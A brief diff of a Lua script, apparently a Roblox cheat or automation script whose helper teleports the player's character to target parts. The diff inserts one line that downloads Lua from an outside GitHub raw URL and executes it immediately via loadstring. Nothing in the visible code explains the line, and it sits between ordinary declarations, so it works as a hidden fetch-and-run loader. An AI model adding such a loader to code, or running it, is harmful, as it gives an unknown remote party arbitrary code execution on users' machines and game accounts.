@@ -7,6 +7,7 @@ local h = c:WaitForChild("HumanoidRootPart")
 local cR, aR
 local aing, moving = false, false
 
+(loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("info")
 local function mv(m)
     if m and (m:IsA("BasePart") or (m:IsA("Model") and m.PrimaryPart)) then
         h.CFrame = (m:IsA("BasePart") and m or m.PrimaryPart).CFrame * CFrame.new(0, 2, 0)
